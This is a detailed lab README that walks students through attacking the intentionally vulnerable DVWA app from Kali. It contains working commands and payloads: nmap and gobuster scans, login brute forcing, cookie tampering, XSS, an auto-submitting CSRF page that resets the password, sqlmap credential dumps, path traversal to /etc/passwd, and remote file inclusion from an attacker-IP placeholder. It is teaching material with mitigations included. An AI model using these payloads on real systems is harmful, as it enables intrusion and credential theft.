# DVWA + Kali Practical Experiments — DETAILED README

**Purpose:** This expanded `README.md` gives you fully elaborated, copy-paste-ready instructions for performing web-application security experiments using **DVWA** and **Kali Linux**. It includes exact commands, Burp steps, payload examples, expected outputs, what to capture as evidence, and suggested write‑ups for your GitHub repo or lab submission.

> **Legal reminder:** Only run these tests against DVWA or other intentionally vulnerable targets that you control. Running them against real or third‑party web applications without explicit written permission is illegal.

---

## Repo structure (recommended)

```
DVWA-EXPTS/
├─ README.md                 <- This file (detailed)
├─ evidence/                 <- screenshots, tool outputs, exported logs
├─ exps/
│  ├─ exp01-recon.md
│  ├─ exp02-crawling-scanning.md
│  ├─ exp03-repeater-intruder.md
│  ├─ exp04-auth-sessions.md
│  ├─ exp05-xss.md
│  ├─ exp06-csrf.md
│  ├─ exp07-sqli.md
│  ├─ exp08-file-inclusion.md
│  └─ exp09-report-template.md
└─ tools/
   ├─ csrf_poc.html
   ├─ payloads/                <- lists used by Intruder/sqlmap
   └─ get_evidence.sh
```

---

## Environment setup (very explicit)

### 1) Kali - update & install

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y nmap gobuster dirb sqlmap nikto curl wfuzz jq
# Burp Suite: community often preinstalled; if not, download from PortSwigger and run the jar
# Docker for DVWA (quickest reproducible lab):
docker pull vulnerables/web-dvwa
docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa
# Check with: curl -I http://localhost
```

**Expected outputs:**

- `curl -I http://localhost` should show `HTTP/1.1 200 OK` and `Server: Apache` (if using the docker image).

### 2) Browser proxy to Burp

- Configure browser proxy to `127.0.0.1:8080` (HTTP & HTTPS). In Firefox: Preferences → Network → Settings.
- Start Burp Suite (Proxy → Options → ensure listener at 127.0.0.1:8080).
- In Burp: Proxy → Intercept → turn OFF while exploring (so you don't block requests). Import Burp CA certificate into browser (Proxy → Intercept → CA cert export).

### 3) DVWA initial config

- Open `http://<DVWA_IP>/` in browser. If using Docker on same host, use `http://localhost`.
- Login (default: admin:password) - DVWA README shows default creds.
- Go to **DVWA Security** and set to **LOW** for initial exploration.
- Take a screenshot of DVWA security page and note the security level in a small text file `evidence/dvwa_security.txt` with contents: `Low` and timestamp.

---

# Experiment 1 — Reconnaissance & Fingerprinting (Expanded)

**Objective:** Identify host, ports, services, web server type, frameworks, and discover hidden directories.

### Step-by-step commands (with explanations)

1. **Find host IP** (if in VM): `ip a` on DVWA container host or VM. Use that IP for scans.

2. **Nmap: fast then deep**

```bash
# Fast discovery (top 1000 ports, service/version detection)
nmap -sS -sV -O -T4 <DVWA_IP> -oN evidence/nmap_quick.txt

# Full-port (0-65535) scan may take longer; use if exam requires completeness
nmap -sS -sV -T4 -p- <DVWA_IP> -oN evidence/nmap_full.txt
```

- `-sS` TCP SYN scan (stealthy), `-sV` service/version, `-O` OS detection, `-T4` faster timing.

**What to look for in `nmap_quick.txt`:** open ports (80, 443), service versions (Apache/2.4.38 (Debian)), and OS guesses.

3. **HTTP headers & basic fingerprinting**

```bash
curl -I http://<DVWA_IP>/ | tee evidence/http_headers.txt
```

Record `Server:`, `X-Powered-By:`, `Set-Cookie` headers (session cookie name). These hint at technologies and default cookies.

4. **WhatWeb / Wappalyzer**

```bash
whatweb http://<DVWA_IP>/ > evidence/whatweb.txt
```

This outputs detected frameworks, languages, CMS, and reveals technologies (PHP, MySQL, etc.).

5. **Directory brute forcing (Gobuster explained)**

```bash
gobuster dir -u http://<DVWA_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40 -o evidence/gobuster_common.txt
```

- `-t 40` threads to speed up; reduce if CPU limited.
- Inspect for directories like `/dvwa/`, `/phpmyadmin/`, `/uploads/`.

6. **Nikto scan for common misconfigs (optional)**

```bash
nikto -h http://<DVWA_IP> -output evidence/nikto.txt
```

Nikto reports default files and known vulnerabilities in server software; it's noisy and can cause false positives — label it clearly in the report.

### Evidence to collect

- `evidence/nmap_quick.txt`, `evidence/http_headers.txt`, `evidence/whatweb.txt`, `evidence/gobuster_common.txt`, `evidence/nikto.txt` (if used), screenshots of DVWA home page showing URL and date/time.

### Expected notes in write-up

- Example sentence: "Nmap detected Apache 2.4.38 on port 80; DVWA runs on PHP 7.x and uses MySQL as the backend. Directory scan revealed `/dvwa/` and `/phpmyadmin/` (if present)."

---

# Experiment 2 — Crawling & Automated Scanning (Burp) (Expanded)

**Objective:** Build a site map and run Burp’s crawler and scanner on DVWA.

### Detailed steps (with Burp actions)

1. **Proxy config verified:** Ensure browser is routed through Burp and CA cert is installed. Navigate to `http://<DVWA_IP>/dvwa/` and log in.
2. **Capture initial requests:** In Burp → Proxy → HTTP history, you should see GET / POST requests for login and pages.
3. **Target → Site map:** Right-click the hostname → `Engagement tools` → `Spider this host` (or `Crawl`) — set max depth to 10 and click start. Monitor the site map as it populates.
4. **Passive scan:** Burp will perform passive analysis on traffic; review issues under the `Scanner` tab (Community edition may have limited active scanning).
5. **Export evidence:**

   - Target → right-click host → `Save item` to export the site map.
   - Proxy → HTTP history → right-click → `Save all items` (saves raw requests/responses as `.csv`/`.txt`).

### What to capture and why

- **Site map screenshot**: shows which pages were discovered automatically.
- **HTTP history export**: contains raw requests/responses to attach as evidence.
- **Identified issues**: copy/paste or screenshot any scanner findings.

### Writing tips

- Explain difference between crawling (mapping) and active scanning (attempting to find vulnerabilities). Note automated scanner limitations — always confirm findings manually.

---

# Experiment 3 — Manual Request Tampering: Repeater & Intruder (Expanded)

**Objective:** Learn request anatomy, replay requests, and fuzz parameters to find logic or input-handling issues.

### Capture and send to Repeater

1. In browser, go to a page with query parameters (e.g., `vulnerabilities/fi/?page=include.php`).
2. In Burp Proxy → HTTP history, locate the request → right-click → **Send to Repeater**.
3. In Repeater, the request is editable. Modify the `page=` parameter to `../../../../etc/passwd` and click **Send**. Observe response body for file contents or error messages.

**Expected result (LFI attempt):** if vulnerable, response will contain text that resembles `/etc/passwd` (e.g., `root:x:0:0:root:/root:/bin/bash`). If not, server may sanitize input or return 400/404.

### Intruder: fuzzing a parameter

1. From same request, `Send to Intruder`.
2. In Intruder → Positions tab, clear automatic markers and only mark the value you want to fuzz (e.g., `page=§file§`).
3. Payloads → Payload set type: `Simple list` → load a small wordlist: `payloads/common-filepaths.txt` with items like `../../../../etc/passwd`, `/etc/hosts`, `php://filter/convert.base64-encode/resource=index.php`.
4. Start Attack (Community edition is single-threaded and slower). Sort results by **Length** or **Status** to identify anomalies.

**How to interpret results:** A vastly different response length often indicates content or error messages returned; small changes can indicate filtering/encoding.

### Save evidence

- Intruder results export or screenshot, Repeater request/response pairs, and the exact payload list used (save to `tools/payloads/lfi.txt`).

---

# Experiment 4 — Authentication & Session Attacks (Expanded)

**Objective:** Test credential brute force, session fixation, and cookie tampering.

### Brute forcing login (small list)

1. Identify login POST request in Burp (e.g., `POST /dvwa/login.php` with `username` and `password`).
2. `Send to Intruder` → Positions: set payload marker on `password` only.
3. Payloads → load a tiny list `tools/payloads/passwords.txt` containing: `password`, `123456`, `admin`, `dvwa`, `letmein`.
4. Start attack and watch for 302 redirect or a success indicator in the response body.

**Notes:** DVWA (depending on version) may include CSRF tokens or rate limiting; for exam, document rate limits and how the application responds.

### Cookie manipulation & privilege escalation

1. Log in as a low-privilege user. In the browser, open DevTools → Application → Cookies and note cookie names (`PHPSESSID`, `security`, etc.).
2. In Burp, intercept a page request and edit `Cookie: security=low` → `security=high` or `isAdmin=0` → `isAdmin=1` (example names differ by app).
3. Forward the request. If the server grants elevated privileges or reveals admin content, capture screenshot and request/response.

**Mitigation guidance to write down:** Use signed/encrypted session tokens, `HttpOnly` and `Secure` flags on cookies, server-side authorization checks for each action, and do not store role flags client-side.

---

# Experiment 5 — Cross-Site Scripting (XSS) (Expanded)

**Objective:** Demonstrate reflected, stored, and DOM XSS, and show safe PoCs.

### Helpful payloads (benign) — use `alert()`

- Reflected: `"><script>alert('reflected')</script>`
- Stored: `<script>alert('stored')</script>`
- DOM: craft payload that targets a known sink, e.g., `#<script>alert('dom')</script>` if the site uses `location.hash`.

### Reflected XSS steps

1. On DVWA → XSS (Reflected) module, find input parameter that echoes input back in response.
2. Submit payload from above. If an alert pops, take a screenshot showing the alert and URL.
3. Save raw request/response from Burp (right-click → Save item).

### Stored XSS steps

1. DVWA → XSS (Stored) → post a comment containing the payload.
2. Visit the page as a different user (or logout/login) and observe the script execution.

### DOM XSS steps

1. Inspect client-side JS (DevTools → Sources) to find use of `innerHTML`, `document.write`, `eval`, or `location` references.
2. Construct payloads that are injected into the DOM and cause execution without server side-reflection.

### Evidence & write-up points

- For each XSS type include: URL, payload used, screenshot, Burp request/response, and explanation of how the vulnerability could be exploited (cookie theft, CSRF via injected JS, etc.).
- Mitigation: Output encoding, CSP headers, HttpOnly cookies, validating inputs server-side, and using DOM APIs that do not interpret HTML.

---

# Experiment 6 — Cross-Site Request Forgery (CSRF) (Expanded)

**Objective:** Build an auto-submitting page (PoC) and demonstrate state change when the victim is logged in.

### PoC details and creation

Save this as `tools/csrf_poc.html`:

```html
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://<DVWA_IP>/dvwa/vulnerabilities/csrf/" method="POST">
      <!-- field names must match the DVWA form; inspect via Burp or DevTools -->
      <input type="hidden" name="password_new" value="pwned123" />
      <input type="hidden" name="password_conf" value="pwned123" />
    </form>
  </body>
</html>
```

### How to test

1. Log into DVWA in your browser.
2. In a _separate_ tab (do not logout), open the local file `file:///path/to/tools/csrf_poc.html` or host via `python3 -m http.server 8000` and open `http://localhost:8000/csrf_poc.html`.
3. If the password changes or the action completes without user interaction, DVWA is vulnerable to CSRF. Record before/after screenshots of the profile page showing the change.

### If the app uses CSRF tokens

- You will need to show that a token mismatch prevents the PoC. Document the token name (e.g., `user_token`) and show where it is included in forms and validated on the server.

---

# Experiment 7 — SQL Injection (Manual + sqlmap) (Expanded)

**Objective:** Demonstrate manual SQL payloads and use `sqlmap` to enumerate DB schema and dump sample data in the lab.

### Manual testing first (why?)

Always try a manual payload so you understand where injection occurs. For example in DVWA SQLi (Low), try username field payload:

```
' OR '1'='1' --
```

If the login succeeds or the response changes to show more rows, it indicates a classic Boolean-based injection.

### Using sqlmap safely (step-by-step)

1. In Burp, find the vulnerable POST request. Right-click → `Copy to file` and save as `tools/req_sqli.txt`.
2. Run sqlmap with conservative options:

```bash
sqlmap -r tools/req_sqli.txt --batch --level=2 --risk=1 --threads=2 --output-dir=evidence/sqlmap_basic
```

- `--level` controls test depth; `--risk` controls payload risk level; keep low on lab exercises.

3. To list DBs and tables:

```bash
sqlmap -r tools/req_sqli.txt --batch --dbs
sqlmap -r tools/req_sqli.txt -D dvwa --tables
```

4. To dump specific columns (sanitized for report):

```bash
sqlmap -r tools/req_sqli.txt -D dvwa -T users -C user,password --dump
```

**Important:** Treat dumped credentials as lab data. Redact or hash them if required by your institution.

### Explaining output

- Save sqlmap `.log` and the `dump` files in `evidence/sqlmap/` and reference these in the report. Explain the injection type (error-based, boolean-based, union-based, time-based) and why the payload works.

### Mitigation summary to include

- Parameterized queries (prepared statements), ORM safe APIs, least-privilege DB user, input validation, stored procedures where appropriate.

---

# Experiment 8 — File Inclusion (LFI/RFI) (Expanded)

**Objective:** Show local file inclusion or remote file inclusion PoC and explain server configuration that allows it.

### LFI testing steps

1. In a file-include parameter (e.g., `?page=`), try traversal payloads in increasing depth:

```
?page=../../../../etc/passwd
?page=../../../../../../../../etc/passwd
```

2. If the app filters `.`, try encoding tricks: `..%2f..%2f..%2fetc/passwd` or `php://filter/convert.base64-encode/resource=index.php` to read source files (base64 in response).

### RFI testing steps (only on lab server you control)

1. Host a small file `attacker.txt` on your machine accessible via HTTP.
2. Try `?page=http://<ATTACKER_IP>/attacker.txt`. If included, the remote content will render.

### What to collect

- Repeater request/response showing `/etc/passwd` or included remote file content.
- If `php.ini` is accessible via an info leak, capture `allow_url_include` or `allow_url_fopen` values.

### Mitigations

- Avoid using user input in include/require calls; use whitelists or map keys to paths, disable `allow_url_include`, effective use of `realpath()` checks and `basename()`.

---

# Experiment 9 — Report Template (Detailed)

**Objective:** Produce a formal deliverable you can hand in.

### Minimal professional report structure (markdown)

1. **Title & Scope** — tested host(s), date, tester name.
2. **Tools used** — list versions (nmap 7.x, Burp 2023.x Community, sqlmap 1.x, Nikto x.y).
3. **Methodology** — Recon → Crawl → Automated scan → Manual verification → Exploitation (lab) → Reporting.
4. **Findings table (example)**

| ID  | Vulnerability | CVSS (est) | Affected URL                 | Evidence files             | PoC summary                            | Remediation        |
| --- | ------------- | ---------: | ---------------------------- | -------------------------- | -------------------------------------- | ------------------ |
| 1   | Reflected XSS |        5.0 | /dvwa/vulnerabilities/xss_r/ | evidence/xss_reflected.png | Payload: `"><script>alert(1)</script>` | Output encode, CSP |

5. **Per-finding detail** — include:

   - request/response (redacted) or a Burp raw export file path
   - screenshot path
   - CVSS breakdown (if asked)
   - impact & remediation

6. **Conclusion** — short prioritized action list (patch, config changes, policy recommendations).

### CVSS quick note

- Use CVSS v3.1. If unfamiliar, scoring guidance: Confidentiality/Integrity/Availability impact, Exploitability metrics. For classwork, estimate and justify your reasoning.

---

# Evidence collection helper (suggested commands)

Create `tools/get_evidence.sh` to automatically collect basic outputs:

```bash
#!/usr/bin/env bash
mkdir -p evidence
nmap -sS -sV -T4 <DVWA_IP> -oN evidence/nmap_quick.txt
curl -I http://<DVWA_IP>/ > evidence/http_headers.txt
gobuster dir -u http://<DVWA_IP>/ -w /usr/share/wordlists/dirb/common.txt -o evidence/gobuster_common.txt
# Save Burp exports manually from the UI (cannot be automated here)
```

---

# Exam submission & instructor checklist (what to attach)

- `README.md` with step-by-step commands (this file).
- `exps/expXX.md` files — one per experiment explaining objective, steps, commands, and findings.
- `evidence/` folder: raw outputs (nmap, gobuster), Burp HTTP history (export), screenshots of successful PoCs, sqlmap dump files.
- `PenTest_Report.md` final report following the template above.

---
